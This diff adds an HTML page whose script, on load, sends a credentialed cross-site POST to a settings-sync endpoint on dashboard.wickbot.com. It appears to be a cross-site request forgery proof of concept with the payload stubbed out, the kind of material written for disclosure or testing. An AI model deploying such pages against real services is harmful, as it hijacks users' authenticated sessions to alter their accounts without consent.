@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      fetch("https://dashboard.wickbot.com/api/settings/sync/1358289702414979255", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ /* simplified payload */ })
+      }).then(res => res.text()).then(console.log);
+    </script>
+  </body>
+</html>
